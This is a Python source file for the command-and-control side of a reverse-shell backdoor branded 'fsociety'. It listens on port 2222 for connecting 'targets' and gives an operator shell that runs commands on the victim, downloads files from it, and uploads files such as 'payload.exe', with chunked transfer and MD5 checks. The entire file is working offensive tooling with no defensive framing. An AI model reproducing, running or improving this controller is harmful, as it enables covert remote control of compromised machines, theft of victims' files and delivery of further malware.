import socket
import json
import os
import termcolor
from art import text2art
import signal
import sys
import base64
import hashlib
from datetime import datetime

HOST_IP = '0.0.0.0'
PORT = 2222
CHUNK_SIZE = 8192

def calculate_md5(filename):
    """Calculate MD5 hash of file"""
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def send_command(data):
    try:
        jsondata = json.dumps(data)
        target.send(jsondata.encode())
        return True
    except socket.error as e:
        print(termcolor.colored(f"\n[!] Error sending command: {e}", "red"))
        return False

def receive_output():
    data = ''
    target.settimeout(10)
    try:
        while True:
            try:
                data += target.recv(1024).decode().rstrip()
                return json.loads(data)
            except json.JSONDecodeError:
                continue
            except socket.timeout:
                if data:
                    return json.loads(data)
                print(termcolor.colored("\n[!] Timeout waiting for response", "yellow"))
                return None
    except Exception as e:
        print(termcolor.colored(f"\n[!] Error receiving output: {e}", "red"))
        return None
    finally:
        target.settimeout(None)

def receive_file(target_filename):
    """Receive file from target with chunked transfer and verification"""
    try:
        # Get metadata from target
        metadata = receive_output()
        if not metadata or isinstance(metadata, str):
            print(termcolor.colored("[!] Failed to receive file metadata", "red"))
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        print(termcolor.colored(f"[*] Receiving file: {target_filename} ({filesize} bytes)", "yellow"))
        
        # Signal ready to receive
        send_command("READY")

        # Receive file in chunks
        md5_hash = hashlib.md5()
        bytes_received = 0
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                chunk = target.recv(min(CHUNK_SIZE, filesize - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)
                
                # Show progress
                progress = bytes_received / filesize * 100
                print(termcolor.colored(f"\r[*] Progress: {progress:.2f}%", "yellow"), end='', flush=True)
                
                # Get progress update from target
                progress_update = receive_output()
                if progress_update and isinstance(progress_update, dict):
                    target_progress = progress_update.get('progress', 0)
                    if abs(target_progress - progress) > 5:  # Check for synchronization
                        print(termcolor.colored("\n[!] Warning: Transfer synchronization mismatch", "yellow"))

        print()  # New line after progress
        
        # Verify transfer
        received_md5 = md5_hash.hexdigest()
        success = received_md5 == expected_md5
        
        if success:
            print(termcolor.colored(f"[+] File {target_filename} downloaded successfully", "green"))
        else:
            print(termcolor.colored("[!] File verification failed", "red"))
        
        return success

    except Exception as e:
        print(termcolor.colored(f"\n[!] Error receiving file: {str(e)}", "red"))
        return False

def send_file(filename):
    """Send file to target with chunked transfer and verification"""
    try:
        if not os.path.exists(filename):
            print(termcolor.colored(f"[!] File {filename} not found", "red"))
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        # Send file metadata
        metadata = {
            'filename': os.path.basename(filename),
            'filesize': filesize,
            'md5': md5_hash
        }
        send_command(metadata)

        # Wait for ready signal
        response = receive_output()
        if response != "READY":
            print(termcolor.colored("[!] Target not ready to receive file", "red"))
            return False

        # Send file in chunks
        print(termcolor.colored(f"[*] Sending file: {filename} ({filesize} bytes)", "yellow"))
        bytes_sent = 0
        
        with open(filename, 'rb') as f:
            while bytes_sent < filesize:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                target.sendall(chunk)
                bytes_sent += len(chunk)
                
                # Show progress
                progress = bytes_sent / filesize * 100
                print(termcolor.colored(f"\r[*] Progress: {progress:.2f}%", "yellow"), end='', flush=True)

        print()  # New line after progress
        
        # Get confirmation from target
        result = receive_output()
        if result and result.get('success'):
            print(termcolor.colored(result['message'], "green"))
            return True
        else:
            print(termcolor.colored("[!] File transfer failed", "red"))
            return False

    except Exception as e:
        print(termcolor.colored(f"\n[!] Error sending file: {str(e)}", "red"))
        return False

# ... rest of the code remains the same ...



def print_help():
    help_text = """
Available Commands:
    help          - Show this help message
    :kill         - Terminate the backdoor connection
    clear         - Clear the terminal screen
    cd <path>     - Change directory on target
    pwd           - Show current directory on target
    download <file> - Download file from target
    upload <file>   - Upload file to target
    
    
File Transfer Examples:
    download hello.txt    - Download hello.txt from target
    upload payload.exe    - Upload payload.exe to target
    """
    print(termcolor.colored(help_text, "cyan"))

def shell():
    while True:
        try:
            command = input(termcolor.colored("fsociety> ", "blue")).strip()

            if not command:
                continue

            if command == "help":
                print_help()
                continue

            if command == "clear":
                os.system("clear")
                continue

            if command.startswith("download "):
                if not send_command(command):  # Send the download command
                    break
                filename = command.split(" ", 1)[1].strip()
                receive_file(filename)
                continue

            elif command.startswith("upload "):
                if not send_command(command):  # Send the upload command
                    break
                filename = command.split(" ", 1)[1].strip()
                send_file(filename)
                continue

            if not send_command(command):
                print(termcolor.colored("[!] Lost connection to target.", "red"))
                break

            if command == ":kill":
                print(termcolor.colored("[*] Terminating backdoor...", "yellow"))
                break

            else:
                response = receive_output()
                if response is not None:
                    print(response)

        except KeyboardInterrupt:
            print(termcolor.colored("\n[!] Use ':kill' to terminate the session", "yellow"))
            continue
            
        except Exception as e:
            print(termcolor.colored(f"\n[!] Error in shell: {str(e)}", "red"))
            break

def signal_handler(sig, frame):
    print(termcolor.colored("\n[!] Server shutting down...", "red"))
    try:
        send_command(":kill")
        target.close()
        server.close()
    except:
        pass
    sys.exit(0)

def main():
    global server, target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST_IP, PORT))
        server.listen(5)
        print(termcolor.colored(f"[*] Server started on port {PORT}", "green"))
        print(termcolor.colored("[*] Waiting for incoming connections...", "yellow"))

        while True:
            target, ip = server.accept()
            print(termcolor.colored(f"\n[+] Target connected from {ip[0]}:{ip[1]}", "green"))

            ascii_art = text2art("FSOCIETY", "random")
            print(termcolor.colored(ascii_art, "red"))
            print_help()

            shell()
            
            print(termcolor.colored("\n[*] Session ended. Waiting for new connection...", "yellow"))
            try:
                target.close()
            except:
                pass

    except Exception as e:
        print(termcolor.colored(f"[!] Critical error: {e}", "red"))
    finally:
        try:
            server.close()
        except:
            pass

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    main()